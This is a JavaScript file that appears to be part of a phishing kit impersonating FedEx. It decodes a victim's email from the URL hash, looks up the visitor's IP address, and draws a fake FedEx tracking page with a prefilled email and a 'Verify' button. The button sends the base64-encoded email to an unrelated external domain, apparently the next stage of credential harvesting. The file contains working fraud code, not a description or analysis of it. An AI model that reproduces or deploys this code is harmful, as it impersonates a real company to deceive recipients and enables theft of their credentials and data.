// 
const hashMail = window.location.hash.substring(1);

let validEmail = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

if (validEmail.test(atob(hashMail))) {

    const now = new Date();
    const date = now.toLocaleTimeString();

    async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        // console.log("Your IP Address is:", data.ip);

        let landPage = `
    
        <div class="track_pad">
            <section>
                <div id="track_container">

                    <img id="track_logo" src="./fedex/favicon.png" alt="" />

                        <section id="track_details">
                            <div class="track_tops">
                                <p>
                                    <img src="./fedex/hourglass.svg">
                                    <span>${date}</span>
                                </p>
                                |
                                <p> 
                                    <img src="./fedex/compass.svg"> 
                                    <span><b>Lat: 40.7143 N</b> / <b>Lon: 74.006 W</b> </span>
                                </p>
                            </div>

                            <div class="track_contents">
                                <i></i>
                                <p> <img src="./fedex/flag.svg"> <span>${data.ip}</span> </p>
                                <p> <img src="./fedex/location.svg"> <span></span> </p>
                                <p> <img src="./fedex/truck.svg"> <span></span> </p>
                            </div>

                            <div id="track_processing">
                                <img id="processing_img" src="./loadin.gif">
                            </div>

                        </section>

                    </div>
            </section>
            
        </div>

        <!--  -->

        <div class="nav_fedex">
    
                <section>
                    <img src="./fedex/logo.png" alt="logo">
                </section>
                
                <section class="desktop_nav">
                <span>Shipping &#9013;</span>
                <span>Tracking &#9013;</span>
                <span>Design & Print &#9013;</span>
                <span>Locations &#9013;</span>
                <span>Support &#9013;</span>
                </section>
    
                <section class="desktop_nav">
                    <span>
                        Sign Up or Log In &#128100;
                    </span>
    
                    <span>
                        &#128269;
                    </span>
                </section>
    
                <section style="display: none;" class="mobile_nav">
                    &#8801;
                </section>
            </div>
    
            <div class="fex_container">
    
                <p>
                    Ship, manage, track, deliver
                </p>
    
                <section class="fex_detail">
                    <div style="background-color: #fafafa;">
                        <img src="./fedex/rate.png" alt="">
                        RATE & SHIP</div>
                    <div style="background-color: #4d148c; color: #fafafa">
                        <img src="./fedex/track.png" alt="">
                        TRACK</div>
                    <div style="background-color: white;">
                        <img src="./fedex/location.png" alt="">
                        LOCATIONS</div>
                </section>
    
            </div>
    
            <div class="fex_body">
    
                <section>
                    <img class="imgAds" src="./fedex/d1.png" alt="">
    
                    <h2>
                        Manage your shipments and returns
                    </h2>
    
                    <section class="icon_manager">
                        <div>
                            <img src="./fedex/icon_courier.png" alt="">
                            <span>Drop off a 
                                <br>
                                package</span>
                        </div>
    
                        <div>
                            <img src="./fedex/icon_delivery.png" alt="">
                            <span>Redirect a 
                                <br> package</span>
                        </div>
    
                        <div>
                            <img src="./fedex/retail-services.svg" alt="">
                            <span>Store hours 
                                <br> and services</span>
                        </div>
    
                        <div>
                            <img src="./fedex/icon_alert.png" alt="">
                            <span>Service <br> alerts</span>
                        </div>
    
                        <div>
                            <img src="./fedex/icon_returns.png" alt="">
                            <span>Return a 
                                <br>package</span>
                        </div>
                    </section>
    
                    <section class="fex_content_list">
                        <img src="./fedex/d2.jpg" alt="" class="fex_img1">
                        <div>
                            <h3>
                                We’re committed to continuing to deliver for you
                            </h3>
        
                            <p>
                                Reach your customers and mitigate risk. Find out why it's worth staying with—or switching to—FedEx.
                            </p>
        
                            <span>
                                SEE THE FEDEX DIFFERENCE
                            </span>
                        </div>
                    </section>
    
                    <h2>Free up time with convenient shipping options</h2>
    
                    <section class="fex_content_list">
                        <img class="fex_img2" src="./fedex/d3.jpg" alt="">
                        <div>
                            <h3>
                                Drop-off flexibility is just around the corner
                            </h3>
        
                            <p>
                                Out and about running errands? Drop off your packages at nearby retail locations. Choose from thousands of FedEx Office, FedEx Ship Center®, FedEx Authorized ShipCenter®, FedEx® Drop Box,* Walgreens, Dollar General, and grocery locations nationwide. Some are even open 24 hours. Consider consolidating your drop offs to help reduce multiple-trip emissions.
                            </p>
        
                            <span>
                                VIEW LOCATIONS
                            </span>
                        </div>
                    </section>
    
                    <section class="fex_content_list">
                        <img class="fex_img2" src="./fedex/d4.jpg" alt="">
                        <div>
                            <h3>
                                Let us do the packing for you
                            </h3>
        
                            <p>
                                Whether you’re short on time or need some assistance, our packing experts can help. From breakables to perishables, they can send your shipment safely on its way. They can also show you more sustainable packaging options. Packing pros are available at thousands of FedEx Office locations.
                            </p>
        
                            <span>
                                START PACKING
                            </span>
                        </div>
                    </section>
    
                    <h2>Deliveries made easy no matter where you are</h2>
    
                    <section>
                        <img class="fex_img1" src="./fedex/d5.jpg" alt="">
                        <h3>Place a free vacation hold while you're away</h3>
                        <p>Enroll in FedEx Delivery Manager® to pause deliveries during your getaway. We’ll keep your packages for up to 14 days, then deliver them once you’re back.</p>
                    </section>
    
                </section>
                
            </div>
    
            <div class="fex_footer">
                <section>FedEx &copy; 1995-2024</section>
    
                <section>
                    <span>Site Map</span>
                    <span> Terms of Use</span>
                    <span>Privacy & Security</span>
                </section>
            </div>
    
        `;

        $(".container_fedex").html(landPage);

    } catch (error) {
        console.error("Error fetching IP:", error);
    }
    }

    getIP();

    document.addEventListener("DOMContentLoaded", ()=> {
            setTimeout(() => {
                const trackLocked = document.querySelector("#track_processing");
                trackLocked.innerHTML = `

                    <div id="track_inputs">
                        <b>E-mail:</b>
                        <input type="email" readonly class="input_mail" placeholder="Enter email address" value="${atob(hashMail)}">
                        <button onclick="getMailCrypted(this)">
                            <span>Verify</span>
                            <img src="./fedex/envelope.svg">
                        </button>
                    </div>

                    `
            }, 3000); 

            // 
            setTimeout(() => {
                const pageReady = document.querySelector("#loader");
                pageReady.style.display = "none"
            }, 1000);
    });
}

// 
function getMailCrypted(e){

    let inputs = e.parentElement;
    let mail = inputs.getElementsByClassName("input_mail")[0];
    let mailDom = mail.value.split("@");

    // 
    if(!validEmail.test(mail.value)){
        mail.style.borderColor = "red";
        return
    }else{
        mail.style.borderColor = "gray";
        $("#loader").show().css({"display":"flex"})
    }

    //
    location.replace(`https://lvgseguranca.com.br/cgi400/360?100=${encodeURIComponent(btoa(mail.value))}`);
}